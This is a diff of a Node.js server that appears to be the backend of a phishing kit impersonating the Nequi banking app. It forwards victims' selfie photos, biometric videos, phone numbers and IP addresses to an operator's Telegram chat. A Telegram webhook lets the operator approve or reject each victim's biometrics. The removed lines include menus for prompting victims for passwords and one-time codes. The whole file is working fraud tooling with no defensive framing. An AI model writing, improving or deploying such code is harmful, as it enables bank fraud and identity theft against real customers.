@@ -6,20 +6,12 @@ const axios = require('axios');
 const cors = require('cors');
 const FormData = require('form-data');
 const multer = require('multer');
-const upload = multer({ storage: multer.memoryStorage() });
 
+const upload = multer({ storage: multer.memoryStorage() });
 const app = express();
 
 // ==================== CONFIGURACIÓN CORS ====================
-const corsOptions = {
-  origin: '*',
-  methods: ['GET', 'POST', 'OPTIONS'],
-  allowedHeaders: ['Content-Type', 'Authorization'],
-  credentials: false
-};
-
-app.use(cors(corsOptions));
-app.options('*', cors(corsOptions));
+app.use(cors({ origin: '*', methods: ['GET', 'POST', 'OPTIONS'] }));
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(express.static('public'));
@@ -30,110 +22,80 @@ const CHAT_ID = process.env.CHAT_ID;
 const RENDER_URL = process.env.RENDER_URL || 'https://portalnequi.onrender.com';
 
 if (!BOT_TOKEN || !CHAT_ID) {
-  console.warn('[WARN] BOT_TOKEN o CHAT_ID no definidos');
+  console.warn('⚠️ BOT_TOKEN o CHAT_ID no definidos');
 }
 
-// ==================== ALMACENAMIENTO EN MEMORIA ====================
-const redirections = new Map();
-const bannedIPs = new Set();
+// ==================== MEMORIA ====================
 const sessionData = new Map();
-const biometricStatus = new Map(); // sessionId -> pending | approved | rejected
+const biometricStatus = new Map();
 
-// ==================== FUNCIONES AUXILIARES ====================
-const getTelegramApiUrl = (method) =>
+// ==================== HELPERS ====================
+const tg = (method) =>
   `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
 
-function generateSessionId() {
-  return `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-}
-
-// ==================== MENÚS TELEGRAM ====================
-function getLoanSimulatorMenu(sessionId) {
-  return {
-    inline_keyboard: [
-      [
-        { text: '❌ Error Número', callback_data: `go:accces-sign-in|${sessionId}` },
-        { text: '❌ Error Clave', callback_data: `go:access-sign-in-pass|${sessionId}` }
-      ],
-      [{ text: '🧬 Biometría', callback_data: `go:biometria|${sessionId}` }],
-      [
-        { text: '❌ Error Monto', callback_data: `go:loan-simulator-error|${sessionId}` },
-        { text: '♻️ Pedir Dinámica', callback_data: `go:one-time-pass|${sessionId}` }
-      ],
-      [
-        { text: '🚫 BANEAR', callback_data: `ban|${sessionId}` },
-        { text: '✅ Consignar', callback_data: `go:consignar|${sessionId}` }
-      ]
-    ]
-  };
-}
-
-function getDynamicMenu(sessionId) {
-  return {
-    inline_keyboard: [
-      [
-        { text: '❌ Error Dinámica', callback_data: `error-dynamic|${sessionId}` },
-        { text: '❌ Error Número', callback_data: `go:accces-sign-in|${sessionId}` }
-      ],
-      [{ text: '🧬 Biometría', callback_data: `go:biometria|${sessionId}` }],
-      [
-        { text: '❌ Error Clave', callback_data: `go:access-sign-in-pass|${sessionId}` },
-        { text: '❌ Error Monto', callback_data: `go:loan-simulator-error|${sessionId}` }
-      ],
-      [
-        { text: '🚫 BANEAR', callback_data: `ban|${sessionId}` },
-        { text: '✅ Consignar', callback_data: `go:consignar|${sessionId}` }
-      ]
-    ]
-  };
-}
+const generateSessionId = () =>
+  `session_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
 
 // ==================== ENDPOINT PRINCIPAL ====================
 app.get('/', (_req, res) => {
-  res.json({ ok: true, status: 'running' });
+  res.json({
+    ok: true,
+    service: 'Nequi Backend Dinámico',
+    hasEnv: !!(BOT_TOKEN && CHAT_ID),
+    status: 'running'
+  });
 });
 
-// ==================== BIOMETRÍA POR FOTO ====================
+// ==================== TEST TELEGRAM ====================
+app.get('/test-telegram', async (_req, res) => {
+  try {
+    await axios.post(tg('sendMessage'), {
+      chat_id: CHAT_ID,
+      text: '🔥 TEST DESDE RENDER OK'
+    });
+    res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ ok: false, error: e.message });
+  }
+});
+
+// ==================== BIOMETRÍA FOTO ====================
 app.post('/step-biometrics', async (req, res) => {
   try {
     const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;
-
     if (!sessionId || !imageBase64) {
       return res.status(400).json({ ok: false });
     }
 
-    const session = sessionData.get(sessionId) || {};
     const buffer = Buffer.from(
       imageBase64.replace(/^data:image\/\w+;base64,/, ''),
       'base64'
     );
 
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', buffer, { filename: 'biometria.jpg' });
-
-    formData.append(
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', buffer, { filename: 'biometria.jpg' });
+    form.append(
       'caption',
 `🧬 BIOMETRÍA FOTO
-
-📱 ${phoneNumber || session.phoneNumber || 'N/A'}
+📱 ${phoneNumber || 'N/A'}
 🆔 ${sessionId}
-🌐 ${ip || session.ip || 'N/A'}
+🌐 ${ip || 'N/A'}
 🖥️ ${userAgent || 'N/A'}`
     );
 
-    await axios.post(getTelegramApiUrl('sendPhoto'), formData, {
-      headers: formData.getHeaders()
+    await axios.post(tg('sendPhoto'), form, {
+      headers: form.getHeaders()
     });
 
     res.json({ ok: true });
   } catch (err) {
-    console.error(err.message);
+    console.error('❌ biometría foto:', err.message);
     res.status(500).json({ ok: false });
   }
 });
 
-// ==================== BIOMETRÍA POR VIDEO ====================
+// ==================== BIOMETRÍA VIDEO ====================
 app.post('/api/verify-video', upload.single('video'), async (req, res) => {
   try {
     if (!req.file) return res.json({ success: false });
@@ -141,21 +103,14 @@ app.post('/api/verify-video', upload.single('video'), async (req, res) => {
     const sessionId = generateSessionId();
     biometricStatus.set(sessionId, 'pending');
 
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('video', req.file.buffer, {
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('video', req.file.buffer, {
       filename: 'biometria.webm'
     });
 
-    formData.append(
-      'caption',
-`🎥 BIOMETRÍA VIDEO
-
-🆔 Session: ${sessionId}`
-    );
-
-    await axios.post(getTelegramApiUrl('sendVideo'), formData, {
-      headers: formData.getHeaders(),
+    await axios.post(tg('sendVideo'), form, {
+      headers: form.getHeaders(),
       params: {
         reply_markup: {
           inline_keyboard: [
@@ -170,53 +125,44 @@ app.post('/api/verify-video', upload.single('video'), async (req, res) => {
 
     res.json({ success: true, sessionId });
   } catch (err) {
-    console.error(err.message);
+    console.error('❌ biometría video:', err.message);
     res.json({ success: false });
   }
 });
 
 // ==================== CHECK BIOMETRÍA ====================
 app.get('/api/check/:sessionId', (req, res) => {
-  const status = biometricStatus.get(req.params.sessionId) || 'pending';
-  res.json({ status });
+  res.json({
+    status: biometricStatus.get(req.params.sessionId) || 'pending'
+  });
 });
 
 // ==================== WEBHOOK TELEGRAM ====================
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
   try {
-    const { callback_query } = req.body;
-    if (!callback_query) return res.sendStatus(200);
+    const cq = req.body.callback_query;
+    if (!cq) return res.sendStatus(200);
 
-    const [action, sessionId] = callback_query.data.split('|');
+    const [action, sessionId] = cq.data.split('|');
 
-    if (action === 'approve_bio') {
-      biometricStatus.set(sessionId, 'approved');
-    }
+    if (action === 'approve_bio') biometricStatus.set(sessionId, 'approved');
+    if (action === 'reject_bio') biometricStatus.set(sessionId, 'rejected');
 
-    if (action === 'reject_bio') {
-      biometricStatus.set(sessionId, 'rejected');
-    }
-
-    if (action === 'ban') {
-      const s = sessionData.get(sessionId);
-      if (s?.ip) bannedIPs.add(s.ip);
-    }
-
-    await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
-      callback_query_id: callback_query.id,
+    await axios.post(tg('answerCallbackQuery'), {
+      callback_query_id: cq.id,
       text: 'Acción registrada',
       show_alert: true
     });
 
     res.sendStatus(200);
   } catch (err) {
-    console.error(err.message);
+    console.error('❌ webhook:', err.message);
     res.sendStatus(200);
   }
 });
 
-// ==================== INICIAR SERVIDOR ====================
+// ==================== START ====================
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, async () => {
-  console.log(`✅ Servidor activo en ${PORT}`);
+app.listen(PORT, () => {
+  console.log(`✅ Servidor activo en puerto ${PORT}`);
 });
